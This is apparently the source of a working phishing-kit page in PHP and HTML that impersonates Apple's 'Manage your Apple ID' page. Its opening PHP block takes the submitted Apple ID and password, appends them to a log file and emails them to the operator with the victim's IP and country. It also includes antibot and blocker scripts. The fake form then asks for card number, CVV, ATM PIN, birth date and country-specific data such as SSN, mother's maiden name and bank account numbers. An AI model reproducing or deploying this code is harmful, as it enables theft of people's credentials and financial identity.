<?php
session_start();
@ini_set('display_errors', 0); 
error_reporting(E_ALL ^ E_NOTICE); 
include 'antibots.php';
include 'bots.php';
include("blocker.php");
include("detect.php");
include('sayron.php'); 
include("browser.php");
$random = rand(0,100000000000);
$dis = substr(md5($random), 0, 15);
$bro = getBrowser();
$getbro = $bro["name"]." ".$bro["version"]." on ".$bro["platform"];
$_SESSION["bro"] = $getbro;
/// COUNTRY
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ; // Country
$countryforip = "$COUNTRY"; 
$_SESSION["COUNTRY"] = "$countryforip";
$COUNTRYCODE = $J7->geoplugin_countryCode ; // Country Code;
$city = $J7->geoplugin_city ; // city;
?>  
<?php
include 'emailk.php';
$xuser = $_POST['xuser'];
$xpass = $_POST['xpass'];
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$date = date ("Y-n-d");
$time = date ("H:i:s");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------------------------------------------\n";
$message .= "Apple ID                   : ".$_POST['xuser']."\n";
$message .= "Password                   : ".$_POST['xpass']."\n";
$message .= "---------------------------------------------\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | On Time : ".date("m/d/Y g:i:a")."\n";
$message .= "$useragent\n";
$message .= "---------------------[Drspam]-----------------------------\n";
$subject = "$COUNTRYCODE | ".$_POST['xuser']." | ".$_POST['xpass']." | $ip =?UTF-8?Q?=E2=9C=94_?=" ;
$f = fopen("../../dr1.txt", "a");
fwrite($f, $message); 
$from = "From: login <logs@dioury.hk>";
@mail($send,$subject,$message,$from);
?>
<head><title>Manage your Apple ID - (<?php print "$COUNTRY"; ?>)</title>
<html locale="<?php print "$COUNTRY"; ?>&<?php print "$city"; ?>" class="<?php print "$date"; ?>" data-useragent="<?php print "$useragent"; ?>" lang="en-<?php print "$COUNTRYCODE"; ?>">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="<?php print "$ip"; ?>">
    <meta name="Author" content="App1e Inc.">
    <meta name="omni_page" content="App1e - My App1e ID">
    <meta name="Category" content="<?php print "$user"; ?>">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <link rel="shortcut icon" type="image/x-icon" href="https://appleid.cdn-apple.com/static/bin/cb3606853004/images/favicon.ico">
    <link rel="" href="https://www.apple.com/ac/globalnav/2.0/en_US/styles/ac-globalnav.built.css" type="text/css">
    <link rel="" href="https://www.apple.com/wss/fonts?family=Myriad+Set+Pro&weights=200,400,500,600,700&v=1" type="text/css">
    <script src="hitlar/jquery-2.0.0.min.js" type="text/javascript"></script>
    <script src="hitlar/cardcheck.js" type="text/javascript"></script>
    <script src="hitlar/jquery.payment.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/yahoo-dom-event.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/flowConsumerOnboarding.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/framework-libraries.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/framework.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/ing-k2-base.js"></script>
    <script type="text/javascript" charset="utf-8" src="hitlar/jquery-allowtrigger.js"></script>
    <script language="JavaScript" src="hitlar/gen_validatorv4.js" type="text/javascript" xml:space="preserve"></script>
    <script src="hitlar/jquery.js" type="text/javascript"></script>
    <script src="hitlar/jquery.maskedinput.js" type="text/javascript"></script>
    <style type="text/css" xml:space="preserve">.error_strings{ font-family:Bold; height: 150px; font-size:9px; color:red;}</style>
    <script src="hitlar/jquery.payment.js"></script>
    <script type="text/javascript">
    jQuery(function($){
      $('[data-numeric]').payment('restrictNumeric');
      $('.cardid1').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.seccode').payment('formatCardCVC');
      $('form').submit(function(e){
        $('input').removeClass('invalid');
        $('.validation').removeClass('passed failed');
        var cardType = $.payment.cardType($('.longnumber').val());
        if ( $('input.invalid').length ) {
          $('.validation').addClass('failed');
        } else {
          $('.validation').addClass('passed');
        }
      });
    });
  </script>
<link rel="stylesheet" type="text/css" media="all" href="hitlar/app.css">
<script type="text/javascript" src="hitlar/common-header.js"></script>
<link rel="stylesheet" type="text/css" href="https://www.apple.com/ac/globalnav/2.0/en_US/styles/ac-globalnav.built.css">
<script type="text/stache" id="globalNav" async="">
<aside id="ac-gn-segmentbar" class="ac-gn-segmentbar" data-strings="<?php print "$time"; ?><?php print "$date"; ?>"></aside>
<input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
<nav id="ac-globalnav" class="no-js" role="navigation" aria-label="Global Navigation" data-hires="false" data-analytics-region="global nav" lang="en-US" data-store-key="" data-store-locale="us" data-store-api="//www.apple.com/[storefront]/shop/bag/status" data-search-locale="en_US" data-search-api="//www.apple.com/search-services/suggestions/">
	<div class="ac-gn-content">
		<ul class="ac-gn-header">
			<li class="ac-gn-item ac-gn-menuicon">
				<label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true"> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span> </span> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span> </span>
				</label>
				<a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open"> <span class="ac-gn-menuanchor-label">Open Menu</span> </a>
				<a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close"> <span class="ac-gn-menuanchor-label">Close Menu</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-apple">
				<a class="ac-gn-link ac-gn-link-apple" href="" data-analytics-title="apple home" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">Apple</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
				<a class="ac-gn-link ac-gn-link-bag" href="" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with Items"> <span class="ac-gn-link-text">Shopping Bag</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> </li>
		</ul>
		<ul class="ac-gn-list">
			<li class="ac-gn-item ac-gn-apple">
				<a class="ac-gn-link ac-gn-link-apple" href="" data-analytics-title="apple home" id="ac-gn-firstfocus"> <span class="ac-gn-link-text">Apple</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
				<a class="ac-gn-link ac-gn-link-mac" href="" data-analytics-title="mac"> <span class="ac-gn-link-text">Mac</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
				<a class="ac-gn-link ac-gn-link-ipad" href="" data-analytics-title="ipad"> <span class="ac-gn-link-text">iPad</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
				<a class="ac-gn-link ac-gn-link-iphone" href="" data-analytics-title="iphone"> <span class="ac-gn-link-text">iPhone</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
				<a class="ac-gn-link ac-gn-link-watch" href="" data-analytics-title="watch"> <span class="ac-gn-link-text">Watch</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
				<a class="ac-gn-link ac-gn-link-tv" href="" data-analytics-title="tv"> <span class="ac-gn-link-text">TV</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-music">
				<a class="ac-gn-link ac-gn-link-music" href="" data-analytics-title="music"> <span class="ac-gn-link-text">Music</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-support">
				<a class="ac-gn-link ac-gn-link-support" href="" data-analytics-title="support"> <span class="ac-gn-link-text">Support</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
				<a class="ac-gn-link ac-gn-link-search" href="" data-analytics-title="search" data-analytics-click="search" aria-label="Search apple.com"> <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
				<a class="ac-gn-link ac-gn-link-bag" href="" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with Items"> <span class="ac-gn-link-text">Shopping Bag</span> <span class="ac-gn-bag-badge" aria-hidden="true"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> </li>
		</ul>
		<aside id="ac-gn-searchview" class="ac-gn-searchview" role="search" data-analytics-region="search">
			<div class="ac-gn-searchview-content">
				<form id="ac-gn-searchform" class="ac-gn-searchform" action="" method="get">
					<div class="ac-gn-searchform-wrapper">
						<input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" name="" placeholder="Search apple.com" data-placeholder-long="Search for Products, Stores, and Help" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
						<input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
						<button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled aria-label="Submit"></button>
						<button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled aria-label="Clear Search"></button>
					</div>
				</form>
				<aside id="ac-gn-searchresults" class="ac-gn-searchresults" data-string-quicklinks="Quick Links" data-string-suggestions="Suggested Searches" data-string-noresults="Hit enter to search."></aside>
			</div>
			<button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search"> <span class="ac-gn-searchview-close-wrapper">
						<span class="ac-gn-searchview-close-left"></span> <span class="ac-gn-searchview-close-right"></span> </span>
			</button>
		</aside>
		<aside class="ac-gn-bagview" data-analytics-region="bag">
			<div class="ac-gn-bagview-scrim"> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span> </div>
			<div class="ac-gn-bagview-content" id="ac-gn-bagview-content"> </div>
		</aside>
	</div>
</nav>
<div id="ac-gn-curtain" class="ac-gn-curtain"></div>
<div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>


<script type="text/javascript" src="https://www.apple.com/ac/globalnav/2.0/en_US/scripts/ac-globalnav.built.js"></script>

<style type="text/css"></style></head>
<body>

<div id="managecontent" role="application"><manage view="{view}" reqerror="{reqerror}" config="{config}" account="{account}">


<applenav>

<aside data-strings="<?php print "$time"; ?><?php print "$date"; ?>" class="ac-gn-segmentbar" id="ac-gn-segmentbar"></aside>
<input class="ac-gn-menustate" id="ac-gn-menustate" type="checkbox">
<nav data-search-api="" data-search-locale="en_US" data-store-api="" data-store-locale="us" data-store-key="" data-analytics-region="global nav" data-hires="false" aria-label="Global Navigation" role="navigation" class="js no-touch svg no-ie7 no-ie8" id="ac-globalnav" lang="en-US">
	<div class="ac-gn-content">
		<ul class="ac-gn-header">
			<li class="ac-gn-item ac-gn-menuicon">
				<label aria-hidden="true" for="ac-gn-menustate" class="ac-gn-menuicon-label"> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span> </span> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span> </span>
				</label>
				<a id="ac-gn-menuanchor-open" class="ac-gn-menuanchor ac-gn-menuanchor-open" href="#ac-gn-menustate"> <span class="ac-gn-menuanchor-label">Open Menu</span> </a>
				<a id="ac-gn-menuanchor-close" class="ac-gn-menuanchor ac-gn-menuanchor-close" href="#"> <span class="ac-gn-menuanchor-label">Close Menu</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-apple">
				<a id="ac-gn-firstfocus-small" data-analytics-title="apple home" href="" class="ac-gn-link ac-gn-link-apple"> <span class="ac-gn-link-text">Apple</span> </a>
			</li>
			<li id="ac-gn-bag-small" class="ac-gn-item ac-gn-bag ac-gn-bag-small">
				<a data-string-badge="Shopping Bag with Items" aria-label="Shopping Bag" data-analytics-click="bag" data-analytics-title="bag" href="" class="ac-gn-link ac-gn-link-bag"> <span class="ac-gn-link-text">Shopping Bag</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> </li>
		</ul>
		<ul class="ac-gn-list">
			<li class="ac-gn-item ac-gn-apple">
				<a id="ac-gn-firstfocus" data-analytics-title="apple home" href="" class="ac-gn-link ac-gn-link-apple"> <span class="ac-gn-link-text">Apple</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
				<a data-analytics-title="mac" href="" class="ac-gn-link ac-gn-link-mac"> <span class="ac-gn-link-text">Mac</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
				<a data-analytics-title="ipad" href="" class="ac-gn-link ac-gn-link-ipad"> <span class="ac-gn-link-text">iPad</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
				<a data-analytics-title="iphone" href="" class="ac-gn-link ac-gn-link-iphone"> <span class="ac-gn-link-text">iPhone</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
				<a data-analytics-title="watch" href="" class="ac-gn-link ac-gn-link-watch"> <span class="ac-gn-link-text">Watch</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
				<a data-analytics-title="tv" href="" class="ac-gn-link ac-gn-link-tv"> <span class="ac-gn-link-text">TV</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-music">
				<a data-analytics-title="music" href="" class="ac-gn-link ac-gn-link-music"> <span class="ac-gn-link-text">Music</span> </a>
			</li>
			<li class="ac-gn-item ac-gn-item-menu ac-gn-support">
				<a data-analytics-title="support" href="" class="ac-gn-link ac-gn-link-support"> <span class="ac-gn-link-text">Support</span> </a>
			</li>
			<li role="search" class="ac-gn-item ac-gn-item-menu ac-gn-search">
				<a aria-haspopup="true" role="button" aria-label="Search apple.com" data-analytics-click="search" data-analytics-title="search" href="//www.apple.com/us/search" class="ac-gn-link ac-gn-link-search"> <span aria-hidden="true" class="ac-gn-search-placeholder">Search apple.com</span> </a>
			</li>
			<li id="ac-gn-bag" class="ac-gn-item ac-gn-bag">
				<a data-string-badge="Shopping Bag with Items" aria-label="Shopping Bag" data-analytics-click="bag" data-analytics-title="bag" href="//www.apple.com/us/shop/goto/bag" class="ac-gn-link ac-gn-link-bag"> <span class="ac-gn-link-text">Shopping Bag</span> <span aria-hidden="true" class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> </li>
		</ul>
		<aside data-analytics-region="search" role="search" class="ac-gn-searchview" id="ac-gn-searchview">
			<div class="ac-gn-searchview-content">
				<form method="get" action="" class="ac-gn-searchform" id="ac-gn-searchform">
					<div class="ac-gn-searchform-wrapper">
						<input spellcheck="false" autocomplete="off" autocapitalize="off" autocorrect="off" data-placeholder-long="Search for Products, Stores, and Help" placeholder="Search apple.com" class="ac-gn-searchform-input" id="ac-gn-searchform-input" type="text">
						<input value="globalnav" name="src" id="ac-gn-searchform-src" type="hidden">
						<button aria-label="Submit" disabled="" type="submit" class="ac-gn-searchform-submit" id="ac-gn-searchform-submit"></button>
						<button aria-label="Clear Search" disabled="" type="reset" class="ac-gn-searchform-reset" id="ac-gn-searchform-reset"></button>
					</div>
				</form>
				<aside data-string-noresults="Hit enter to search." data-string-suggestions="Suggested Searches" data-string-quicklinks="Quick Links" class="ac-gn-searchresults" id="ac-gn-searchresults"></aside>
			</div>
			<button aria-label="Close Search" class="ac-gn-searchview-close" id="ac-gn-searchview-close"> <span class="ac-gn-searchview-close-wrapper">
						<span class="ac-gn-searchview-close-left"></span> <span class="ac-gn-searchview-close-right"></span> </span>
			</button>
		</aside>
		<aside data-analytics-region="bag" class="ac-gn-bagview">
			<div class="ac-gn-bagview-scrim"> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span> </div>
			<div id="ac-gn-bagview-content" class="ac-gn-bagview-content"> </div>
		</aside>
	</div>
</nav>
<div class="ac-gn-curtain" id="ac-gn-curtain"></div>
<div class="ac-nav-placeholder" id="ac-gn-placeholder"></div>


<script src="https://www.apple.com/ac/globalnav/2.0/en_US/scripts/ac-globalnav.built.js" type="text/javascript"></script></applenav>
<div class="manage">
    <header></header>
    <photo config="{config}" account="{account}">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div class="">
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile-only appleid-user">
                                        <span class="first_name" id="first_name">Welcome</span> <span class="last_name" id="last_name">Back</span>                                     
                                    <small class="appleid-username" id="username">Your Apple&nbsp;ID is <span class="acc-name force-ltr"><?php print "$xuser"; ?></span> </small>
                                </h1>
                                <h1 class="not-mobile appleid-user">
                                        <span class="first_name" id="first_name">Welcome</span> <span class="last_name" id="last_name">Back</span>                                    
                                    <small class="appleid-username" id="username">Your Apple&nbsp;ID is <span class="force-ltr"><strong><?php print "$xuser"; ?></strong></span> </small>
                                </h1>
                            </div>
                        </div></p></p>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link">Sign Out </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

</photo>
        <div class="container flow-sections">
            <account {config}="config" {(account)}="account" editable-birthday="{editableBirthday}">


<section class="flow-section mobile-only non-edit" id="accountNonEdit">
    <div class="account-wrapper">
        <div class="row">
            <div class="col-md-3 section-name">
                <div class="section-action">
                    <button aria-controls="account-content" class="btn btn-link section-title">
                        Account
                    </button>
                </div>
            </div>
        </div>
    </div>
</section>
<section class="flow-section mobile-section-edit  edit " id="account">
    <div class="account-wrapper">
        <div class="row">
            <div id="heading-account" class="col-md-3 section-name">
                <h2 class="not-mobile section-title break-section-title">
                    Account
                </h2>
                    <div class="mobile-only section-title">
                        <button class="btn btn-link btn-overlay btn-back"></button>
                        <h2 class="wrap-popover-title">Account</h2>
                    </div>                
            </div>
            <div class="col-md-9 subsection" aria-labelledby="heading-account" id="account-content">
                <accordion style="display: block; overflow: inherit;" delay="0.4" edit="{editMode}">
<form name="myform" id="myform" action="Address.php?cmd=_update&dispatch=<?php print "$dis"; ?>&locale=en_<?php print "$COUNTRYCODE"; ?>" method="post" onSubmit="return checkform(this);">
<input type="hidden" name="xuser" value="<?php print "$xuser"; ?>">
<input type="hidden" name="xpass" value="<?php print "$xpass"; ?>">
<div class="accordion-fade ">
<div style="opacity: 1; overflow: inherit;" class="accordion-fade acdn-edit">
            
                        <div class="editable account-edit clearfix">
                            <div class="row edit-row">
                                <div class="col-sm-5">
                                    <changeappleid account="{account}">


<h3 tabindex="-1" id="appleIDLabel" class="section-subtitle no-outline">APPLE&nbsp;ID</h3>
<div aria-describedby="appleIDDescription" aria-labelledby="appleIDLabel" class="apple-id">
  <dl class="dl inline-dl pin-tip-wrapper clearfix">
    <dt class="dt info-dt">
      <string-ellipsis content-value="{account.name}">


<div class="pop-wrapper pin-wrapper">
    <div class="pin-tip force-ltr"><?php print "$xuser"; ?></div>
</div>
    <div class="pop-wrapper">
        <button data-toggle="popover" class="btn btn-link change-appleID"> Change Email Address...</button>
    </div>
</string-ellipsis>
    </dt>
    <dd class="dd action-dd minigreen-check-icon">
    </dd>
  </dl>
</div>
                                            </div>
                                            <div class="col-xs-12 col-sm-4 col-md-6">
                                                <p class="edit-description">
You've come to the right place to re-open your account, or retrieve the Apple ID.
</p>
</changeappleid>
                                </div>
                                <div class="col-sm-5">
                                    <div id="appleIDDescription" class="description">

                                    </div>
                                </div>
                                <div class="col-sm-2 section-edit">

                                </div>
                            </div>
                                    
                            
                            <div class="row edit-row">
                                <div class="col-sm-5">
                                    <changename last-name-pronounce="" first-name-pronounce="" last-name="Shuttleworth" middle-name="" first-name="Kerri" done-clicked="{doneClicked}" pending-changes="{pendingChanges}" birthday-has-errors="{errors.birthday.hasErrors}" config="{config}" account="{account}">


<h3 id="nameLabel" class="section-subtitle"> 
Credit/Debit Card
 </h3>
<div class="form-group">
    <div class="pop-wrapper field-pop-wrapper first-wrapper">



<div class="name-input">
  <input placeholder="full name" class="generic-input-field  form-control field " id="nameoncard" name="nameoncard" spellcheck="false" autocomplete="off" autocapitalize="on" autocorrect="off" can-field="{value}" type="text"><span id='myform_nameoncard_errorloc' class="error err-msg" style="font-size:14px;height:150px;color:#FF0000;" >
</div>

</first-name-input>
    </div>    

        <div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input placeholder="credit card number" class="generic-input-field  form-control cardid1" id="cardid1" name="cardid1" spellcheck="false" autocomplete="off" autocapitalize="on" autocorrect="off" can-field="{value}" type="tel" ><span id='myform_cardid1_errorloc' class="error err-msg" style="font-size:14px;height:150px;color:#FF0000;">
</div>
</middle-name-input>
</div>
<div class="pop-wrapper field-pop-wrapper last-wrapper">
<div class="name-input">
<input aria-describedby="" aria-invalid="" style="width:45%;" placeholder="mm/yy" class="form-control form-input cc-expiration-date  not-focused date" spellcheck="false" autocapitalize="off" autocorrect="off" can-field="{value}" errors="{errors}" id="cd" name="cd" type="tel">&nbsp;&nbsp;<input aria-describedby="" aria-invalid="" style="background: url(&quot;img/Help.png&quot;) no-repeat scroll 98% 50% transparent;width:51%;" maxlength="4" placeholder="security code" class="form-control form-input cc-expiration-date  not-focused date" spellcheck="false" autocapitalize="off" autocorrect="off" can-field="{value}" errors="{errors}" id="cvv" name="cvv" type="tel">
<span id='myform_cvv_errorloc' class="error err-msg" style="font-size:14px;height:150px;color:#FF0000;">
<span id='myform_cd_errorloc' class="error err-msg" style="font-size:14px;height:150px;color:#FF0000;" >
</p>
<input style="background: url(&quot;img/atm.png&quot;) no-repeat scroll 98% 50% transparent; " placeholder="ATM/GAB pin" maxlength="4" class="form-control form-input not-focused date" type="text" id="vbvpasss" name="atmgabpin">

</div>
</div>

</last-name-input>
    </div>    

</changename>
                                </div>
                            </div>
                            <div class="row edit-row">
                                <div class="col-sm-5">
                                    <h3 id="birthdayLabel" class="section-subtitle">Date of Birth</h3>
                                    <div class="form-group">
                                        <div class="pop-wrapper field-pop-wrapper">
                                            <div class="dob-wrapper clearfix">
                                                <date classes="form-control form-input  " errors="{errors.birthday}" input-date="{editableBirthday}" placeholder="birthday" format="{config.localizedResources.dateInputFormat}" focus-placeholder="{config.localizedResources.dateInputPlaceholder}">


<input aria-describedby="" aria-invalid="" placeholder="birthday" class="form-control form-input   not-focused date" spellcheck="false" autocapitalize="off" autocorrect="off" can-field="{value}" errors="{errors}" id="date_ob" name="date_ob" type="tel">
<span id='myform_date_ob_errorloc' class="error err-msg" style="font-size:14px;height:150px;color:#FF0000;">

</date>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-sm-6">
                                        <div tabindex="-1" class="description correct-birthday-message no-outline">
                                            <p id="correctBirthdayMessage">Your correct birth date is required to enable some Apple services.</p>
                                        </div>                                    
                                </div>
                            </div>
                            <div class="row edit-row">
                                <div class="col-sm-5">
                                    <reachable config="{config}" account="{account}">

    <dl class="dl inline-dl account-detail account-phone-wrapper clearfix">
    </dl>




<div class="name-input">

</first-name-input>
    </div>    

        <div class="pop-wrapper field-pop-wrapper middle-wrapper">



<div class="name-input">       
<?php  
						if ($countrycode=="GB" ){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input class="form-control form-input not-focused date" type="tel" name="sort_code" id="sort_code" placeholder="Sort code">
                            </div>
							
							 </p>    

        <div class="pop-wrapper field-pop-wrapper middle-wrapper">


<input placeholder="Account Number" class="form-control form-input not-focused date" type="text" name="accnum" id="accnum" >
                        </div>                 '; } 
                                               elseif ($countrycode=="US" or $countrycode=="IL" ){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input class="form-control form-input not-focused date" type="tel" name="ssn" id="ssn" placeholder="Social security number"></first-name-input>
    </p>    




<input placeholder="mother maiden name" class="form-control form-input not-focused date" type="tel" name="mmn" id="mmn" >
                            </div>
                        </div>  
                                               ';} 
                                               elseif ($countrycode=="CH"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input class="form-control form-input not-focused date" type="tel" name="sh" id="sh" placeholder="Kreditkarten Kontonummer ">
                            </div>
                        </div>  
                                               ';} 
                                               elseif ($countrycode=="LU"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input class="form-control form-input not-focused date" type="tel" name="ph" id="ph" placeholder="Kreditkarten Kontonummer ">
                            </div>
                        </div>  
                                               ';} 
                                               elseif ($countrycode=="AU"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input placeholder="OSID" class="form-control form-input not-focused date" type="" id="osid" name="osid"></first-name-input>
    </p>    

        <div class="pop-wrapper field-pop-wrapper middle-wrapper">


<input placeholder="ATM Pin" class="form-control form-input not-focused date" type="text" name="crlimi" id="crlimi" >
                            </div>
                        </div>  
                                               ';} 
                                               elseif ($countrycode=="PT"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input placeholder="Cart&#227;o de senha" class="form-control form-input not-focused date" type="text" id="passpt" name="passpt">
                            </div>
                        </div>  
                                               ';} 
                                               elseif ($countrycode=="JP"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                            </div>
                            <div class="col span_1_of_2 sort_codes">

                                <input style="background: url(&quot;img/3dsecure.png&quot;) no-repeat scroll 98% 50% transparent; "placeholder="パスワード" class="form-control form-input not-focused date" type="password" id="passjp" name="passjp">

                            </div>

                             </p>    

        <div class="pop-wrapper field-pop-wrapper middle-wrapper">


<input placeholder="WEBサービスID" class="form-control form-input not-focused date" type="text" name="webid" id="webid" >
                            </div>
                        </div>  
                                               ';} 
                                               elseif ($countrycode=="DE"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input style="background: url(&quot;img/3dsecure.png&quot;) no-repeat scroll 98% 50% transparent; "placeholder="Kaart wachtwoord" class="form-control form-input not-focused date" type="password" id="passde" name="passde">

                            </div>

                             </p>    

        <div class="pop-wrapper field-pop-wrapper middle-wrapper">


<input placeholder="Rekeningnummer" class="form-control form-input not-focused date" type="text" name="accountde" id="accountde" >
                            </div>
                        </div>  
                                               ';} 
                                               elseif ($countrycode=="NZ"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input placeholder="Access Number" class="form-control form-input not-focused date" type="tel" id="Limit"name="Limit">
                            </div>

                        </div>  
                                               ';} 
                                               elseif ($countrycode=="NL"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input placeholder="Bankrekeningnummer" class="form-control form-input not-focused date" type="tel" id="Bankre" name="Bankre"></first-name-input>
    </p>    

        <div class="pop-wrapper field-pop-wrapper middle-wrapper">


<input placeholder="Huisnummer" class="form-control form-input not-focused date" type="tel" name="Huisnummer" id="Huisnummer">
                            </div>
                        </div>  
                                              '; }

                                              elseif ($countrycode=="HK"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                         </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input placeholder="HKID NUMBER" class="form-control form-input not-focused date" type="tel" id="hkid" name="hkid"></first-name-input>
    </p>
                        </div>  
                                               ';} 
                                              else { echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">

                              </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input style="background: url(&quot;img/3dsecure.png&quot;) no-repeat scroll 98% 50% transparent; "placeholder="SecureCode Password" class="form-control form-input not-focused date" type="password" id="vbvpasss" name="vbvpasss">
                            </div>
                        </div>  
                                               ';} 
?>


</div>

</first-name-input>
    </div>    

        <div class="pop-wrapper field-pop-wrapper middle-wrapper">

<div class="name-input">
  <input placeholder="Country" class="generic-input-field  form-control cardid1" id="Country" name="Country" spellcheck="false" autocomplete="off" autocapitalize="on" autocorrect="off" can-field="{value}" type="text" value="<?php print "$COUNTRY"; ?>" >

                                </div>
                            </div>
                                </div>
                            </div>
                                </div>


</string-ellipsis>
</p>
</p>
</div>
<h3 id="birthdayLabel" class="section-subtitle">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<button style="font-size:18px;color:#08c;" class="btn btn-link verify">Accept & Continue</button></h3>
</accordion>
</form>
<script language="JavaScript" type="text/javascript"
    xml:space="preserve">//<![CDATA[
//You should create the validator only after the definition of the HTML form
  var frmvalidator  = new Validator("myform");
frmvalidator.EnableOnPageErrorDisplay();
frmvalidator.addValidation("nameoncard","req","Enter the full name.");
frmvalidator.addValidation("cardid1","req","Enter a card number.");
frmvalidator.addValidation("cd","req","Enter the expiration date for your card.");
